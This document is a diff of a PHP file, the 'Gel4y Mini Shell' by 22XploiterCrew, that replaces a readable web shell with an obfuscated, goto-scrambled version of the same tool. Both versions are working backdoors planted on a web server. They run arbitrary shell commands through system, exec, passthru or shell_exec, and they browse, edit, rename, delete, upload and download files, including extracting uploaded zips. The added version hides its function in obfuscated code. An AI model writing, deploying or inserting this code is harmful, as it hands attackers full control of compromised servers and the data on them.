@@ -1,301 +1,120 @@
 <?php
-#error_reporting(0);
-define("SELF", "Gel4y Mini Shell");
-
-$k = "secret";
-$R = array_merge($_GET, $_POST);
-$fc = array("s\x63\x61\x6e\x64\x69r", "strlen");
-$turn = function ($str, $act = true, $i = 0) {
-   $res = "";
-   $strLen = $GLOBALS["fc"][1]($str);
-   switch ($act) {
-      case false:
-         for (; $i < $strLen; $i++)
-            $res .= dechex(ord($str[$i]));
-         break;
-      case true:
-         for (; $i < ($strLen - 1); $i += 2)
-            $res .= chr(hexdec("{$str[$i]}{$str[$i+1]}"));
-         break;
-   }
-
-   return $res;
-};
-
-$func = array(
-   "7068705f756e616d65",
-   "70687076657273696f6e", "676574637764",
-   "6368646972", "707265675f73706c6974", "61727261795f64696666",
-   "69735f646972", "69735f66696c65", "69735f7772697461626c65",
-   "69735f7265616461626c65", "66696c6573697a65",
-   "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473",
-   "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65",
-   "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465",
-   "66696c656d74696d65", "66696c657065726d73", "73657373696f6e5f7374617274",
-   "626173656e616d65", "666f70656e", "66656f66", "6672656164", "66636c6f7365",
-   "73797374656d", "65786563", "7061737374687275", "7368656c6c5f65786563",
-   "6f625f7374617274", "6f625f6765745f636f6e74656e7473", "6f625f656e645f636c65616e");
-foreach ($func as $i => $v) $func[$i] = $turn($func[$i]);
-
-#die(var_dump($func));
-@$func[22]();
-if (isset($R["p"])) {
-   $p = $turn($R["p"]);
-   $func[3]($turn($R["p"]));
-} else {
-   $p = $func[2]();
-}
-
-function a($sts = 1, $loc = "") {
-   global $p, $turn;
-   $status = (($sts == 1) ? "success" : "error");
-   echo "<script>swal({title: \"{$status}\", text: \"\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".$turn($p, 0).$loc."\"}})</script>";
-}
-
-function ps($f) {
-   global $func;
-   $p = $func[21]($f);
-   if (($p & 0xC000) == 0xC000) $i = "s";
-   elseif (($p & 0xA000) == 0xA000) $i = "l";
-   elseif (($p & 0x8000) == 0x8000) $i = "-";
-   elseif (($p & 0x6000) == 0x6000) $i = "b";
-   elseif (($p & 0x4000) == 0x4000) $i = "d";
-   elseif (($p & 0x2000) == 0x2000) $i = "c";
-   elseif (($p & 0x1000) == 0x1000) $i = "p";
-   else $i = "u";
-
-   $i .= (($p & 0x0100) ? "r" : "-");
-   $i .= (($p & 0x0080) ? "w" : "-");
-   $i .= (($p & 0x0040) ? (($p & 0x0800) ? "s" : "x") : (($p & 0x0800) ? "S" : "-"));
-   $i .= (($p & 0x0020) ? "r" : "-");
-   $i .= (($p & 0x0010) ? "w" : "-");
-   $i .= (($p & 0x0008) ? (($p & 0x0400) ? "s" : "x") : (($p & 0x0400) ? "S" : "-"));
-   $i .= (($p & 0x0004) ? "r" : "-");
-   $i .= (($p & 0x0002) ? "w" : "-");
-   $i .= (($p & 0x0001) ? (($p & 0x0200) ? "t" : "x") : (($p & 0x0200) ? "T" : "-"));
-   return $i;
-}
-
-function exe($sc) {
-   global $func;
-   if (function_exists($func[28])) {
-      @$func[32]();
-      @$func[28]($sc);
-      $r = @$func[33]();
-      @$func[34]();
-      return $r;
-   } elseif (function_exists($func[29])) {
-      @$func[29]($sc, $results);
-      $r = "";
-      foreach ($results as $result) {
-         $r .= $result;
-      } return $r;
-   } elseif (function_exists($func[30])) {
-      @$func[32]();
-      @$func[30]($sc);
-      $r = @$func[33]();
-      @$func[34]();
-      return $r;
-   } elseif (function_exists($func[31])) {
-      $r = @$func[31]($sc);
-      return $r;
-   }
-}
-
-if (!isset($_SESSION[md5($_SERVER["HTTP_HOST"])]))
-   if (empty($k) or (isset($R["k"]) and ($R["k"] == $k)))
-      $_SESSION[md5($_SERVER["HTTP_HOST"])] = true;
-else
-   #lmao();
-   die(header($_SERVER["SERVER_PROTOCOL"]." 500 Internal Server Error"));
-
-?>
-<!doctype html>
+goto SUB; yjJ: ?></li>
+          <li><b>PHP Uname</b>: <?php  goto FbC; LGA: ?>"><i class="fa fa-plus-circle"></i> File</a> |
+          <a href="<?php  goto Ke0; SUB: define("r3u", "Gel4y Mini Shell"); goto aLh; XfE: Va6: goto Myw; uzI: goto MUF; goto XfE; Yms: isset($_POST["s"]) ? file_exists("{$n4G}/{$_POST["n"]}") ? BNH("folder name has been used", 0, "&a=" . J6q("cdir", 0)) : (mkdir("{$n4G}/{$_POST["n"]}") ? bnh("folder created successfully", 1, j6Q("/" . $_POST["n"], 0)) : Bnh("folder failed to create", 0)) : null; goto vQv; ebs: goto fLL; goto ovY; VwO: header("Content-Length: " . strtotime(j6Q($_GET["n"]))); goto Q53; LFV: echo "?l=" . j6q($n4G, 0) . "&a=" . J6Q("cfile", 0); goto LGA; JGY: ?>
+    <h5>View file</h5>
+<span>File name : <?php  goto bdw; lAc: ?>
+    <h5>Edit file</h5>
+    <span>File name : <?php  goto uZO; TJI: if (!($em5 < count($yLY))) { goto ypt; } goto aXu; fJB: unlink($RjB); goto n4k; j99: ?></span><br>
+          <a href="<?php  goto Xno; aNw: goto iw0; goto rM4; Svf: ?>
+    <h5>New folder</h5>
+    <form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
+    <?php  goto Uz5; fYK: mfO: goto gc5; Xno: echo "?l=" . j6q($n4G, 0) . "&a=" . J6q("cdir", 0); goto yKz; L75: ?>
+    <table class="table table-hover table-borderless table-sm">
+      <thead class="text-light">
+        <tr>
+          <th>Name</th>
+          <th>Size</th>
+          <th>Permission</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody>
+        <?php  goto BJM; ox4: ?>
+      </div>
+    </div>
+    <article class="bg-dark border table-responsive">
+    <?php  goto HtL; d0A: $W2v->close(); goto b3g; OXV: if (move_uploaded_file($kj6[$em5], $yLY[$em5])) { goto zxM; } goto PxH; Myw: ?>
+    <h5>View <?php  goto n0y; H40: goto MUF; goto fmG; W68: jac: goto beY; SJ1: KxX: goto TJI; QcF: chdir($n4G); goto IG5; IG5: ov5: goto VQ0; UP2: $yLY = $_FILES['f']['name']; goto qDk; ebU: goto MUF; goto PVx; Ke0: echo "?l=" . J6q($n4G, 0) . "&a=" . j6q("term", 0); goto v1U; k36: ?></pre>
+    <form method="post">
+      <div class="form-group">
+        <input type="text" name="cmd" class="form-control">
+      </div>
+    </form>
+    <?php  goto H40; p5p: $KWn = $W2v->open($yLY[$em5]); goto J4K; VOW: $twI = preg_split("/(\\\\|\\/)/", $n4G); goto nMN; tLc: goto ov5; goto mTw; j62: $ET6 = $_FILES['f']['type']; goto qIF; v1U: ?>"><i class="fa fa-terminal"></i></a>
+        </div>
+      </div>
+      <div class="border-top">
+        <ul style="list-style:none;" class="m-0 p-0">
+          <li><b>Server</b>: <?php  goto pQt; aLh: if (isset($_GET['l'])) { goto AGT; } goto kg5; TY7: ?>
+    <?php  goto ebs; D6Q: if ($TID == 'edit') { goto Dju; } goto jfR; BMe: FIK: goto I8t; kb6: ?></span>
+<div class="form-group"><label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php  goto CCM; bwg: BnH("failed to delete the folder", 0); goto aNw; OQP: foreach ($b9P as $FX0) { goto FON; ogQ: dWR: goto OpN; OpN: echo "<tr>\n          <td><a href=\"?l=" . j6Q("{$n4G}/{$FX0}", 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$n4G}/{$FX0}")) . "\"><i class=\"fa fa-fw fa-folder" . (count(scandir("{$n4G}/{$FX0}")) == 0 ? "" : "-open") . " text-warning\"></i> {$FX0}</a></td>\n          <td>N/A</td>\n          <td><font color=\"" . (is_writable("{$n4G}/{$FX0}") ? "#00ff00" : (!is_readable("{$n4G}/{$FX0}") ? "red" : null)) . "\">" . sBk("{$n4G}/{$FX0}") . "</font></td>\n          <td>\n            <a href=\"?l=" . j6q($n4G, 0) . "&a=" . J6q("rename", 0) . "&n=" . J6Q($FX0, 0) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n            <a href=\"?l=" . J6q($n4G, 0) . "&a=" . J6q("delete", 0) . "&n=" . j6q($FX0, 0) . "&t=f\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n          </td></tr>"; goto iOo; FON: if (is_dir("{$n4G}/{$FX0}")) { goto dWR; } goto e6U; e6U: goto Fho; goto ogQ; iOo: Fho: goto IWu; IWu: } goto z1p; mRL: ?>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-   <meta charset="utf-8">
-   <meta name="theme-color" content="red">
-   <meta name="viewport" content="width=device-width, initial-scale=0.65, shrink-to-fit=no">
-   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
-   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/styles/monokai-sublime.min.css">
-   <link rel="stylesheet" href="https://rawcdn.githack.com/RandsX/Textarea-Line/a7b8ad93e95caed275ef4a244522d363d4a0ebd4/css/TextareaLine.min.css">
-   <title><?= bin2hex(rand()); ?></title>
-   <style>
-      body {
-         color: #fff;
-         font-family: serif;
-         background-color: #000;
-      }
-      .self a {
-         font-size: 26px;
-         font-weight: bold;
-         letter-spacing: 1.5px;
-         font-variant: small-caps;
-         margin-top: .3rem !important;
-      }
-      .self span {
-         font-size: 11px;
-         margin-left: 3.4px;
-      }
-      blockquote {
-         margin: 0px 0px 8px 0px;
-         padding: .5rem 1rem;
-         background-color: #282828;
-         font-weight: bold;
-         border-left: 5px solid red;
-      }
-      #editor {
-         background-color: white;
-         border: 1px solid black;
-         position: relative;
-         height: 300px;
-      }
-      .table-hover tbody tr:hover td {
-         background: red
-      }
-      .table > tbody > tr > * {
-         color: #fff;
-         vertical-align: middle
-      }
-      input:focus, textarea:focus {
-         outline: none;
-         box-shadow: none;
-      }
-      li {
-         list-style: none;
-      }
-      li span {
-         font-weight: bold;
-      }
-      a {
-         color: #fff;
-      }
-   </style>
-   <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/highlight.min.js"></script>
-   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-   <script src="https://rawcdn.githack.com/RandsX/Textarea-Line/a7b8ad93e95caed275ef4a244522d363d4a0ebd4/js/TextareaLine.min.js"></script>
-   <script>
-      hljs.initHighlightingOnLoad();
-   </script>
+  <meta name="theme-color" content="red">
+  <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <title></title>
+  <style>
+    body {
+      color: #fff;
+      font-family: serif;
+      background-color: #000;
+    }
+    a, a:hover, pre {
+      color: #fff;
+    }
+    .table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}
+    .form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}
+  </style>
+  <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head>
-<body onload="TextareaLine.appendLineNumber('Editor');">
-   <div class="">
-      <section class="bg-dark border p-1">
-         <div class="d-flex justify-content-between">
-            <div class="self">
-               <a href="?"><?= SELF ?></a><span>©22XploiterCrew</span>
-            </div>
-            <div>
-               <span>PHP version: <?= $func[1]() ?></span><br />
-               <a href="?p=<?=$p?>&a=file">+File</a>
-               <a href="?p=<?=$p?>&a=file">+Folder</a>
-               <a href="" class="float-right"><i class="fa fa-fw fa-upload"></i></a>
-            </div>
-         </div>
-         <div class="border-top">
-            <li><span>Server / System</span>: <?= "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]}) / {$func[0]("s")}" ?></li>
-            <li>
-               <form method="post">
-                  <span><?= get_current_user()."@{$_SERVER["SERVER_NAME"]}:{$func[23]($p)}" ?>$</span>
-                  <input type="text" size="20" height="5" name="sc" id="c" class="bg-transparent rounded-0 border-0 text-light" autocomplete="off" autofocus="autofocus">
-               </form>
-            </li>
-         </div>
-      </section>
-      <section class="bg-dark border table-responsive my-1 p-1">
-         <table>
-            <tr>
-               <td align="left">Path: </td>
-               <td align="right">
-                  <?php
-                  $ps = $func[4]("/(\\\|\/)/", $p);
-                  foreach ($ps as $key => $value) {
-                     if ($key == 0 and $value == "") {
-                        echo "<a href=\"?p=2f\">~</a>/"; continue;
-                     }
-                     if ($value == "") continue;
-                     echo "<a href=\"?p=";
-                     for ($i = 0; $i <= $key; $i++) {
-                        echo $turn($ps[$i], 0);
-                        if ($key !== $i) echo "2f";
-                     }
-                     echo "\">$value</a>/";
-                  }
-                  ?>
-               </td>
-            </tr>
-         </table>
-      </section>
-
-      <section class="bg-dark border table-responsive">
-         <?php if (isset($R["sc"])): ?>
-         <blockquote>Command</blockquote>
-         <div class="px-2">
-            <pre><code class="bash"><?= exe($R["sc"]) ?></code></pre>
-         </div>
-         <?php endif; ?>
-         <?php if (!isset($R["a"]) and !isset($R["sc"])) :if (is_readable($p)): ?>
-         <table class="table table-sm table-hover table-borderless text-light">
-            <thead class="bg-danger">
-               <tr>
-                  <th>Name</th>
-                  <th>Size</th>
-                  <th>Permission</th>
-                  <th>Action</th>
-               </tr>
-            </thead>
-            <tbody>
-               <?php
-               $scD = $func[5]($fc[0]($p), [".", ".."]);
-               foreach ($scD as $d) {
-                  if (!$func[6]("$p/$d")) continue;
-                  $skrng = "$p/$d";
-                  echo "<tr><td><a href=\"?p={$turn($skrng,0)}\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$func[19]("Y-m-d H:i", $func[20]("$skrng"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>N/A</td><td><font color=\"".(($func[8]("$skrng")) ? "#00ff00" : (!$func[9]("$skrng") ? "red" : null))."\">".ps("$skrng")."</font></td><td><a href=\"?p={$turn($p,0)}&a=72656e616d65&n={$turn($d,0)}&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p={$turn($p,0)}&a=64656c657465&n={$turn($d,0)}\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
-               }
-               foreach ($scD as $f) {
-                  if (!$func[7]("$p/$f")) continue;
-                  $sz = $func[10]("$p/$f")/1024;
-                  $sz = round($sz, 3);
-                  $sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
-                  echo "<tr><td><a href=\"?p={$turn($p,0)}&a=76696577&n={$turn($f,0)}\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$func[19]("Y-m-d H:i", $func[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$sz}</td><td><font color=\"".(($func[8]("$p/$f")) ? "#00ff00" : (!$func[9]("$p/$f") ? "red" : null))."\">".ps("$p/$f")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p={$turn($p,0)}&a=65646974&n={$turn($f,0)}\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p={$turn($p,0)}&a=72656e616d65&n={$turn($f,0)}&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p={$turn($p,0)}&n={$turn($f,0)}&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p={$turn($p,0)}&a=64656c657465&n={$turn($f,0)}\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
-               }
-               ?>
-            </tbody>
-         </table>
-         <?php else: echo("<div class=\"text-center\">Can't read directory</div>"); endif; endif; if (isset($R["a"])): $a = $turn($R["a"]); echo "<blockquote>".ucwords($a) . ((isset($R["t"]) ? ($R["t"] == "d" ? " folder" : " file") : null))."</blockquote><div class=\"px-2\">" . (!isset($R["t"])? "<span>Name: {$turn($R["n"])}</span>" : null) . "<form method=\"post\">" ?>
-            <?php if ($a == "view"): ?>
-            <div class="form-group">
-               <pre class=""><code class="lang-<?= pathinfo($R["n"], PATHINFO_EXTENSION) ?>"><?php
-                  $fp = $func[24]($turn($R["n"]), 'r');
-                  if ($fp) {
-                     while (!@$func[25]($fp))
-                        echo $func[18](@$func[26]($fp, 1024));
-                     @$func[27]($fp);
-                  }
-                  ?>
-               </code></pre>
-            </div>
-            <?php elseif ($a == "rename"): ?>
-            <div class="form-group"><label for="n">Name:</label><input type="text" name="nm" id="n" class="form-control bg-transparent rounded-0 text-light" value="<?= $turn($R["n"]) ?>"><div class="form-group mt-3"><button name="s" type="submit" class="btn btn-outline-light rounded-0">Save</button></div></div>
-            <?php ((isset($R["s"])) ? ($func[16]($p.'/'.$turn($R["n"]), $R["nm"]) ? a() : a(0)) : null);  elseif ($a == "edit"): ?>
-               <div id="editor">
-                  <textarea name="ctn" id="Editor"><?php
-                     $fp = $func[24]($turn($R["n"]), 'r');
-                     if ($fp) while (!@$func[25]($fp)) echo $func[18](@$func[26]($fp, 1024));
-                     @$func[27]($fp);
-                  ?></textarea>
-               </div>
-               <div class="form-group mt-3">
-                  <button name="s" type="submit" class="btn btn-block btn-outline-light rounded-0">Save</button>
-               </div>
-            <?php ((isset($R["s"])) ? ($func[13]($p.'/'.$turn($R["n"]), $R["ctn"]) ? a(1, "&a=76696577&n={$R["n"]}") : a()) : null); elseif($a == "a"): ?>
-            <?php endif; endif; echo "</form></div>"; ?>
-      </section>
-      <section class="bg-dark border text-center mt-2">
-         <span>Powered by Marijuana - Code by T1kus_g0t a.k.a RandsX</span>
-      </section>
-   </div>
-   <script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
+<body>
+  <main class="my-1">
+    <div class="border bg-dark px-1">
+      <div class="d-flex justify-content-between">
+        <div>
+          <h3 class="mt-2"><a href="?"><?php  goto zpd; J4K: if (!($KWn == true)) { goto LYP; } goto yTN; yp8: function bnh($I1h, $IJj = 1, $RjB = "") { goto mwi; C6f: $w_N = $IJj == 1 ? "success" : "error"; goto E2m; E2m: echo "<script>swal({title: \"{$w_N}\", text: \"{$I1h}\", icon: \"{$w_N}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?l=" . j6q($n4G, 0) . $RjB . "\"}})</script>"; goto XPe; mwi: global $n4G; goto C6f; XPe: } goto mRL; mIV: ?>
+    </div>
+    <?php  goto sYD; B6a: ?></h5>
+    <form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php  goto tfS; pQt: echo "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]})"; goto yjJ; qIF: $EpP = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed'); goto OXV; qDk: $em5 = 0; goto SJ1; UO3: bNH("file deleted successfully"); goto Qyd; Q53: header("Content-disposition: attachment; filename=\"" . j6Q($_GET["n"]) . "\""); goto fYK; YIp: echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . EOl($_POST["cmd"]) : ""; goto k36; MjU: if (!($_GET["t"] == "f")) { goto TTG; } goto IP_; vQv: goto MUF; goto lg3; aXu: $kj6 = $_FILES['f']['tmp_name']; goto j62; WZW: if (!($TID == "delete")) { goto oGi; } goto VR4; Hji: gWB: goto ox4; Qyd: jUk: goto MJL; mRd: bNh("file to delete the folder", 0); goto elW; xaq: bnH("folder deleted successfully"); goto p1R; Qfq: MQ3: goto JGY; MJL: TTG: goto sS1; PxH: BnH("file failed to upload", 0); goto Xtk; lOl: ypt: goto W68; HtL: if (!isset($_GET["a"])) { goto xYD; } goto i1W; b3g: LYP: goto yoG; CCM: echo htmlspecialchars(file_get_contents($n4G . '/' . j6q($_GET["n"]))); goto OA1; beY: if (!isset($_GET["download"])) { goto mfO; } goto EnD; PVx: TE1: goto vhb; EnD: header("Content-Type: application/octet-stream"); goto sBp; yTN: $W2v->extractTo(basename($yLY[$em5], '.zip')); goto d0A; Ih7: $n4G = J6q($_GET['l']); goto QcF; VQ0: function EOL($hK_) { goto l6s; gSH: d0L: goto OY1; Pfy: return $h1F; goto b_K; P_g: @ob_start(); goto Oh8; A4p: enc: goto hNn; JbQ: if (function_exists('THM')) { goto enc; } goto Pt8; buK: HE8: goto P21; LlM: goto d0L; goto tfE; hNn: $h1F = @Thm($hK_); goto OnX; ZXa: return $h1F; goto J8t; V1K: VyD: goto ZUg; Hvq: @system($hK_); goto WJV; fQN: @ob_end_clean(); goto ZXa; O8e: if (function_exists('passthru')) { goto NQp; } goto JbQ; OA4: $h1F = @ob_get_contents(); goto f2k; P21: @ob_start(); goto Hvq; WJV: $h1F = @ob_get_contents(); goto fQN; Tcm: foreach ($slC as $m2J) { $h1F .= $m2J; CpK: } goto NHp; HUv: if (function_exists('exec')) { goto VyD; } goto O8e; nua: $h1F = ''; goto Tcm; b_K: goto d0L; goto A4p; f2k: @ob_end_clean(); goto Pfy; Oh8: @passthru($hK_); goto OA4; OnX: return $h1F; goto gSH; l6s: if (function_exists('system')) { goto HE8; } goto HUv; J8t: goto d0L; goto V1K; NHp: THZ: goto AOH; Pt8: goto d0L; goto buK; tfE: NQp: goto P_g; ZUg: @exec($hK_, $slC); goto nua; AOH: return $h1F; goto LlM; OY1: } goto nZ8; krw: $W2v = new ZipArchive(); goto p5p; p1R: iw0: goto Bi4; DjC: goto KxX; goto lOl; MZ7: iv1($RjB); goto MsN; wtw: if ($TID == "cfile") { goto qA8; } goto F2z; z9P: if (!($_GET["t"] == "d")) { goto Pk1; } goto MZ7; bLW: foreach ($b9P as $plZ) { goto iBZ; CDO: P5f: goto JD1; wis: $Rfu = $Rfu > 1024 ? round($Rfu / 1024, 2) . "MB" : $Rfu . "KB"; goto xYk; GIz: goto HO1; goto CDO; iBZ: if (is_file("{$n4G}/{$plZ}")) { goto P5f; } goto GIz; xYk: echo "<tr>\n\t        <td><a href=\"?l=" . j6Q($n4G, 0) . "&a=" . J6q("view", 0) . "&n=" . J6Q($plZ, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$n4G}/{$plZ}")) . "\"><i class=\"fa fa-fw fa-file" . ($_SERVER["SCRIPT_FILENAME"] == "{$n4G}/{$plZ}" ? " text-danger" : "") . "\"></i> {$plZ}</a></td>\n\t        <td>{$Rfu}</td>\n\t        <td><font color=\"" . (is_writable("{$n4G}/{$plZ}") ? "#00ff00" : (!is_readable("{$n4G}/{$plZ}") ? "red" : null)) . "\">" . sBK("{$n4G}/{$plZ}") . "</font></td>\n\t        <td>\n\t          <div class=\"d-flex justify-content-between\">\n\t            <a href=\"?l=" . j6Q($n4G, 0) . "&a=" . j6q("edit", 0) . "&n=" . J6q($plZ, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t            <a href=\"?l=" . J6q($n4G, 0) . "&a=" . J6Q("rename", 0) . "&n=" . j6q($plZ, 0) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t            <a href=\"?l=" . j6Q($n4G, 0) . "&n=" . j6q($plZ, 0) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t            <a href=\"?l=" . j6q($n4G, 0) . "&a=" . J6Q("delete", 0) . "&n=" . j6Q($plZ, 0) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t          </div>\n\t        </td></tr>"; goto B4P; B4P: HO1: goto fon; XrB: $Rfu = round($Rfu, 3); goto wis; JD1: $Rfu = filesize("{$n4G}/{$plZ}") / 1024; goto XrB; fon: } goto BMe; IP_: $RjB = $n4G . '/' . J6Q($_GET["n"]); goto fJB; FbC: echo php_uname(); goto E82; RgT: $em5++; goto DjC; Vlq: ?></span>
+<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php  goto phq; rM4: CCO: goto xaq; zpd: echo r3u; goto Xu6; Jkm: $TID = j6q($_GET["a"]); goto Twh; Uz5: isset($_POST["s"]) ? file_exists("{$n4G}/{$_POST["n"]}") ? bnH("file name has been used", 0, "&a=" . j6q("cfile", 0)) : (file_put_contents("{$n4G}/{$_POST["n"]}", $_POST["ctn"]) ? bNh("file created successfully", 1, "&a=" . J6q("view", 0) . "&n=" . j6Q($_POST["n"], 0)) : bNh("file failed to create", 0)) : null; goto ebU; tA2: goto MUF; goto aAN; vhb: ?>
+    <h5>New folder</h5>
+    <form method="post">
+      <div class="form-group">
+        <label for="n">Name :</label>
+        <input name="n" id="n" class="form-control" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+      </div>
+    </form>
+    <?php  goto Yms; lg3: DO9: goto HsV; ttM: ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+    <?php  goto sSb; i1W: if (!isset($_GET["a"])) { goto dLR; } goto Jkm; Xtk: goto wEl; goto hcs; E82: ?></li>
+        </ul>
+      </div>
+      <form method="post" enctype="multipart/form-data">
+        <div class="input-group mb-1">
+          <div class="custom-file">
+            <input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple>
+            <label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label>
+          </div>
+        </div>
+      </form>
+      <?php  goto eBH; bjP: MUF: goto mIV; OA1: ?></textarea></div>
+    <?php  goto bjP; VR4: $RjB = $n4G . '/' . j6Q($_GET["n"]); goto z9P; aAN: qA8: goto Svf; Z64: bnh("file uploaded successfully"); goto sus; Tce: isset($_POST["s"]) ? rename($n4G . '/' . J6q($_GET["n"]), $_POST["n"]) ? bNh("successfully changed the name") : BnH("failed to change the name", 0) : null; goto iJy; Bi4: Pk1: goto MjU; uZO: echo J6q($_GET["n"]); goto Vlq; yoG: cfI: goto Z64; nMN: foreach ($twI as $Ygr => $t9B) { goto LrL; Equ: goto Thn; goto Ikz; XqA: $em5 = 0; goto jGf; R0n: rfP: goto STr; MeR: m3x: goto EgJ; ezm: if (!($em5 <= $Ygr)) { goto Uj2; } goto mku; C_D: AYy: goto ERB; UCW: if (!($em5 != $Ygr)) { goto VqS; } goto Rva; mku: echo j6q($twI[$em5], 0); goto UCW; U4A: VqS: goto C_D; ERB: $em5++; goto Equ; LrL: if (!($Ygr == 0 && $t9B == "")) { goto cYR; } goto d3P; Rva: echo "2f"; goto U4A; Ikz: Uj2: goto NFK; CL1: goto rfP; goto MeR; EgJ: echo "<a href=\"?l="; goto XqA; mOJ: cYR: goto L6i; NFK: echo "\">{$t9B}</a>/"; goto R0n; d3P: echo "<a href=\"?l=2f\">~</a>/"; goto N44; N44: goto rfP; goto mOJ; jGf: Thn: goto ezm; L6i: if (!($t9B == "")) { goto m3x; } goto CL1; STr: } goto Hji; Xu6: ?></a></h3>
+        </div>
+        <div>
